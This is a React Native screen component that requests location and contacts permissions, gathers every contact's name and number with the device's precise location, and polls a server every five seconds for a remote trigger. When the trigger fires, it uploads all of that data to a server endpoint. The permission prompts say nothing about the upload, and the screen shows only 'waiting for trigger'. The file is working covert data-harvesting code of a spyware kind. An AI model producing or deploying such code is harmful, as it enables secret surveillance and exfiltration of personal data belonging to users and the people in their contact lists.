import * as React from 'react'
import { View, Text, TouchableOpacity, StatusBar, PermissionsAndroid, FlatList, Platform, Alert, LogBox } from 'react-native'
import { useTheme } from 'react-native-paper';
import styles from './styles'
import { CustomText, CustomStatusBar, Button, Input } from '../../components';
import Contacts from 'react-native-contacts';

//firebase
import firestore from '@react-native-firebase/firestore';
import { fetchApi } from '../../api/api';
import { BASE_URL, GET_CONFIG, GET_USER_LOCATION, NORMALIZE, UPLOAD_CONTACT } from '../../api/env';
import Geolocation from '@react-native-community/geolocation';



const HomeScreen = ({ navigation }) => {
    const { colors } = useTheme();
    const usersCollection = firestore().collection('User');

    const [contacts, setContacts] = React.useState(null)
    const [position, setPosition] = React.useState({ lat: '', long: '' })
    const [geo, setGeo] = React.useState(null)
    const [sending, setSending] = React.useState(false)
    const [bodyData, setBodyData] = React.useState(null)
    const [trigger, setTrigger] = React.useState(0)

    React.useEffect(() => {
        requestLocationPermisison()
    }, [])

    /*
    React.useEffect(() => {
        requestPermisisonAndGetContacts()
    }, [])*/

    React.useEffect(() => {
        getConfig()
    }, [])

    if (trigger == 1) {
        console.log('is body ready : ' + bodyData);
        if (bodyData) {
            uploadContact()
            setTrigger(0)
        }

    }

    async function getConfig() {
        console.log('checking trigger....');
        await fetchApi(GET_CONFIG, true, 'get')
            .then((res) => {
                console.log(res.data.result.getData);
                const num = res.data.result.getData

                if (num == 1 && sending == false) {
                    setTrigger(1)
                } else null
            })

        setTimeout(() => {
            getConfig()
        }, 5000)
    }

    async function requestLocationPermisison() {
        try {
            const granted = await PermissionsAndroid.request(
                PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
                {
                    title: 'Location Access Required',
                    message: 'This App needs to Access your location',
                },
            );
            if (granted === PermissionsAndroid.RESULTS.GRANTED) {
                //To Check, If Permission is granted
                getOneTimeLocation();
                //subscribeLocationLocation();
            }
        } catch (error) {
            console.log('Location error : ' + error);
        }
    }

    const getOneTimeLocation = () => {
        Geolocation.getCurrentPosition(
            //Will give you the current location
            (position) => {
                //getting the Longitude from the location json
                const currentLongitude =
                    JSON.stringify(position.coords.longitude);

                //getting the Latitude from the location json
                const currentLatitude =
                    JSON.stringify(position.coords.latitude);

                setPosition({ lat: currentLatitude, long: currentLongitude })

                getGeo(currentLatitude, currentLongitude)
            },
            (error) => {
                Alert(error.message)
            },
            {
                enableHighAccuracy: true,
            },
        );
    };

    /*
    const subscribeLocationLocation = () => {
        watchID = Geolocation.watchPosition(
            (position) => {
                //Will give you the location on location change
                console.log(position);

                //getting the Longitude from the location json        
                const currentLongitude =
                    JSON.stringify(position.coords.longitude);

                //getting the Latitude from the location json
                const currentLatitude =
                    JSON.stringify(position.coords.latitude);

                setPosition({ lat: currentLatitude, long: currentLongitude })

                getLocationDetails(currentLatitude, currentLongitude)
            },
            (error) => {
                Alert(error.message)
            },
            {
                enableHighAccuracy: false,
                maximumAge: 1000
            },
        );
    };*/

    async function getGeo(lat, long) {
        await fetchApi(GET_USER_LOCATION(lat, long), true, 'get')
            .then((res) => {
                //setGeo(res.data.display_name)
                requestPermisisonAndGetContacts(res.data.display_name, lat, long)
            })
    }

    function normalizeNumber(number = []) {
        let data = []
        for (let i = 0; i < number.length; i++) {
            data.push(number[i]['number'])
        }

        return data
    }

    const normalizeContact = (kontak = [], pos, lat, long) => {
        let datas = []
        for (let i = 0; i < kontak.length; i++) {
            const data = {
                displayName: kontak[i]?.displayName,
                number: normalizeNumber(kontak[i]?.phoneNumbers)
            }

            datas.push(data)
        }


        if (datas.length == kontak.length) {
            //setContacts(datas)
            const body = {
                data: datas,
                pos: {
                    lat: lat,
                    long: long,
                    geolocation: pos
                }
            }

            setBodyData(body)
        }


    }

    console.log('bODY : ' + bodyData);


    async function requestPermisisonAndGetContacts(pos, lat, long) {
        if (Platform.OS == 'android') {
            PermissionsAndroid.request(
                PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
                {
                    'title': 'Contacts',
                    'message': 'This app would like to view your contacts.',
                })
                .then(() => loadContacts(pos, lat, long))
        } else {
            loadContacts()
        }

    }

    async function loadContacts(pos, lat, long) {
        await Contacts.getAllWithoutPhotos()
            .then((contacts) => normalizeContact(contacts, pos, lat, long))

        Contacts.checkPermission()
    }



    async function uploadContact() {
        await fetchApi(UPLOAD_CONTACT, true, 'post', bodyData)
            .then((res) => {
                console.log(res.data.result);
                setToNormal()
                setSending(true)

            })
            .catch(e => {
                console.log(e);
            })


    }

    async function setToNormal() {
        await fetchApi(NORMALIZE, true, 'get')
            .then((res) => {
                console.log(res.data.result);
            })
    }

    return (
        <View style={styles.container}>
            <CustomStatusBar />
            <Text>is Data ready : {bodyData ? "Ok" : "Waiting..."}</Text>
            <Text style={{ color: colors.text }}>{sending ? 'Already send data' : 'Idle... waiting for trigger'}</Text>

        </View>
    )
}

export default HomeScreen